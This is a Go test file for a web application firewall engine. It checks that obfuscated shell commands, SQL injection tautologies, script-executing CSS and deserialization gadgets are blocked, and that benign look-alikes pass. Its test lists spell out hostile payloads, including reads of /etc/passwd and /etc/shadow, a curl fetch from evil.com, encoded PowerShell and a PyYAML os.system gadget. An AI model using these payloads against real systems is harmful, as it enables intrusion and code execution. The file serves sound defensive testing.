package engine

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"wewaf/internal/core"
)

// rceBodyBlocked runs a payload as a urlencoded form body through both phases.
func rceBodyBlocked(eng *Engine, payload string) bool {
	b := "cmd=" + url.QueryEscape(payload)
	req := httptest.NewRequest(http.MethodPost, "/run", strings.NewReader(b))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	tx := core.NewTransaction(nil, req, nil)
	tx.SetMetadata("body", []byte(b))
	return eng.ProcessRequestHeaders(tx) != nil || eng.ProcessRequestBody(tx) != nil
}

// TestRCEObfuscationBlocked covers shell-obfuscation evasion techniques: the
// detection targets the technique's structure ($IFS, brace expansion, Windows
// encoded-command) or its goal (the sensitive target file) rather than only
// the literal command, so quote/backslash/wildcard command-splitting that
// hides the command but still reads /etc/passwd is caught.
func TestRCEObfuscationBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	attacks := []string{
		"cat$IFS$9/etc/passwd",                       // bare $IFS whitespace evasion
		"cat${IFS}/etc/passwd",                       // braced IFS
		"{cat,/etc/passwd}",                          // brace expansion
		"{curl,http://evil.com/x}",                   // brace expansion, external fetch
		"c'a't /etc/passwd",                          // quote-split command
		`c\at /etc/passwd`,                           // backslash-split command
		`ca""t /etc/passwd`,                          // double-quote-split command
		"/bin/c?t /etc/passwd",                       // wildcard command
		"/???/cat /etc/passwd",                       // wildcard path
		"cat /etc/shadow",                            // sensitive target
		"cmd /c whoami",                              // windows cmd
		"cmd.exe /c dir",                             // windows cmd.exe
		"powershell -enc ZQBjAGgAbwAgaGk=",           // ps encoded (abbrev)
		"powershell.exe -EncodedCommand ZQBjAGgAbwA", // ps encoded (full)
	}
	for _, p := range attacks {
		p := p
		t.Run(p, func(t *testing.T) {
			if !rceBodyBlocked(eng, p) {
				t.Errorf("RCE obfuscation not blocked: %q", p)
			}
		})
	}
}

// TestRCEObfuscationNoFalsePositive confirms the new RCE rules don't fire on
// ordinary prose / structured data that merely resembles the patterns.
func TestRCEObfuscationNoFalsePositive(t *testing.T) {
	eng := newFuzzEngine(t)
	legit := []string{
		"normal text about cats and dogs",
		"{name, value}",                   // JS object literal (space after comma)
		"config: {timeout, retries}",      // JS-ish, space after comma
		"powershell scripting tutorial",   // word "powershell" without exec
		"please update the cmd reference", // word "cmd" without /c
		"my notes about ssh and aws",
		`{"key":"value","n":1}`, // JSON
	}
	for _, p := range legit {
		p := p
		t.Run(p, func(t *testing.T) {
			if rceBodyBlocked(eng, p) {
				t.Errorf("legit body wrongly blocked as RCE: %q", p)
			}
		})
	}
}

// TestSymbolicLogicalSQLiBlocked is the regression for the sqlmap
// symboliclogical tamper: OR/AND replaced with ||/&& and quoted operands.
// SQLI-003 only matched the keyword/digit forms, so these tautologies slipped
// past until SQLI-025/026 were added.
func TestSymbolicLogicalSQLiBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	attacks := []string{
		`1'||'1'='1`,
		`1'&&'1'='1`,
		`1' || '1' = '1`,
		`x'||'a'='a`,
	}
	for _, p := range attacks {
		p := p
		t.Run(p, func(t *testing.T) {
			if !rceBodyBlocked(eng, p) {
				t.Errorf("symbolic-logical SQLi tautology not blocked: %q", p)
			}
		})
	}
	// JS/shell logical operators without the string-equality tautology shape
	// must NOT trip the rule.
	legit := []string{
		"true||false", "a && b", "x=1||y=2", "cfg = host||'localhost'",
		"https://example.com/?a=1||2",
	}
	for _, p := range legit {
		p := p
		t.Run("legit_"+p, func(t *testing.T) {
			if rceBodyBlocked(eng, p) {
				t.Errorf("legit ||/&& wrongly blocked as SQLi: %q", p)
			}
		})
	}
}

// TestCSSScriptExecutionBlocked covers script-executing CSS constructs inside
// a <style> tag (which XSS-013 missed — it only handled style= attributes):
// -moz-binding, IE behavior:url(), and javascript:/vbscript: in url(). It must
// NOT fire on external @import/url() (Google Fonts, CDNs) which are legitimate.
func TestCSSScriptExecutionBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	mal := []string{
		"<style>a{-moz-binding:url(//evil/x.xml#x)}</style>",
		"<style>b{behavior:url(evil.htc)}</style>",
		"<style>c{background:url(javascript:alert(1))}</style>",
		"<style>d{background:url('vbscript:msgbox')}</style>",
		"<style>@import url('javascript:alert(1)')</style>",
	}
	for _, p := range mal {
		p := p
		t.Run("block_"+p, func(t *testing.T) {
			if !rceBodyBlocked(eng, p) {
				t.Errorf("malicious CSS construct not blocked: %q", p)
			}
		})
	}
	legit := []string{
		"<style>@import url('https://fonts.googleapis.com/css?family=Roboto');</style>",
		"<style>.hdr{background:url('//cdn.example.com/bg.png')}</style>",
		"<style>body{color:#333;margin:0}</style>",
		"the behavior of the app changed yesterday",
	}
	for _, p := range legit {
		p := p
		t.Run("allow_"+p, func(t *testing.T) {
			if rceBodyBlocked(eng, p) {
				t.Errorf("legit CSS/prose wrongly blocked: %q", p)
			}
		})
	}
}

// TestDeserializationGadgetsBlocked covers deserialization gaps found in
// round-4 fuzzing: PyYAML !!python/object/apply RCE form, Json.NET $type
// gadget chains, and the RAW Java serialization magic bytes (which Go's
// UTF-8 regexp can't express, so an engine byte-check handles them).
func TestDeserializationGadgetsBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	mal := []string{
		`!!python/object/apply:os.system ["id"]`,
		`!!python/object/new:os.system`,
		`!!ruby/object:Gem::Requirement`,
		`{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start"}`,
		`{"x":{"$type":"System.IO.FileSystemWatcher"}}`,
		string([]byte{0xac, 0xed, 0x00, 0x05}),                  // raw java magic
		string([]byte{0xac, 0xed, 0x00, 0x05, 0x73, 0x72}),      // magic + TC_OBJECT
		"prefix" + string([]byte{0xac, 0xed, 0x00, 0x05, 0x73}), // embedded
	}
	for _, p := range mal {
		p := p
		t.Run("block", func(t *testing.T) {
			if !rceBodyBlocked(eng, p) && !deserRaw(eng, p) {
				t.Errorf("deserialization gadget not blocked: %.40q", p)
			}
		})
	}
	legit := []string{
		`{"$type":"MyApp.Models.User, MyApp","name":"alice"}`, // legit Json.NET $type
		`python object oriented tutorial`,
		`use !! for emphasis`,
		string([]byte{0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a}), // PNG magic
	}
	for _, p := range legit {
		p := p
		t.Run("allow", func(t *testing.T) {
			if deserRaw(eng, p) {
				t.Errorf("legit input wrongly blocked as deserialization: %.40q", p)
			}
		})
	}
}

// deserRaw posts a raw (non-form) body so binary magic bytes survive intact.
func deserRaw(eng *Engine, body string) bool {
	r := httptest.NewRequest(http.MethodPost, "/api", strings.NewReader(body))
	r.Header.Set("Content-Type", "application/octet-stream")
	tx := core.NewTransaction(nil, r, nil)
	tx.SetMetadata("body", []byte(body))
	return eng.ProcessRequestHeaders(tx) != nil || eng.ProcessRequestBody(tx) != nil
}
